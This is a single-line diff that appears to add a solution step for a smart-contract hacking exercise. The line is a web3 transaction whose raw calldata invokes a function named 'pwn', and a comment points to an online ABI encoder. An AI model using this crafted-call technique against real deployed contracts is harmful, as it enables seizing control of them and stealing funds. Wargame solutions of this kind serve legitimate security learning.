@@ -1,0 +1,1 @@
+await contract.sendTransaction({from:player, to:contract.address, data:"dd365b8b"}) // Data corresponds to a ABI encoded call to "pwn" function (see https://abi.hashex.org/ for doing it online) 
